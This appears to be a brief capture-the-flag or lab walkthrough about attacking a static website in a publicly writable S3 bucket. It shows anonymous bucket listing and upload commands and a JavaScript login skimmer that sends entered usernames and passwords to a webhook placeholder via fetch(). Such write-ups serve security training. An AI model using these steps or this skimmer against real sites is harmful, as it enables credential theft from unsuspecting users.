-----------------

### Static

-----------------

- Load the site and view source code-:

<img width="1291" height="368" alt="image" src="https://github.com/user-attachments/assets/4a391dd8-2127-4940-bb98-c725d9ac5e9a" />

- Enumerate the bucket with `--no-sign-request`-:

```bash
aws s3 ls s3://[url]/ --no-sign-request
```

<img width="766" height="85" alt="image" src="https://github.com/user-attachments/assets/7f59aadc-97e0-41b5-9255-24d57a3ea106" />

- `PutObject` is enabled-:

```
aws s3 cp <flename> s3://[url]/ --no-sign-request
```

<img width="899" height="72" alt="image" src="https://github.com/user-attachments/assets/a8000a44-f29c-4452-93f0-c52cc741ba19" />

- Malicious js-:

```javascript
document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("login-btn").addEventListener("click", function () {
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
	var creds = `${username}%20${password}`;
        fetch("[webhook]?password="+creds);
    });
});
```

- Result-:

<img width="1441" height="686" alt="image" src="https://github.com/user-attachments/assets/d06418be-e99b-4681-8134-25acadcc58e0" />



